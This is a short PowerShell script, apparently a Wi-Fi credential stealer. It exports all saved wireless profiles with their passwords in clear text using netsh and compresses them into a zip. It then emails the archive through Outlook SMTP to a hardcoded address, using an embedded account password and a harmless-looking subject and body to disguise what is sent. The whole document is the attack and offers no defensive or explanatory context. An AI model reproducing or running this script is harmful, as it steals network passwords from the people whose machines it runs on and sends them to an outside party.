netsh wlan export profile key=clear
Compress-Archive -U -Path .\*.xml -DestinationPath temp.zip


$EmailTo = "avigepal57@outlook.com"
$EmailFrom = "avigepal57@outlook.com"
$Subject = "hello there!!" 
$Body = "how are you??"
$smtpServer = "smtp.outlook.com" 
$smtpMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
$attach = new-object Net.Mail.Attachment("temp.zip")
$smtpMessage.Attachments.Add($attach)
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
$SMTPClient.EnableSsl = $true	 
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("avigepal57@outlook.com", "Root@roxx1"); 
$SMTPClient.Send($smtpMessage)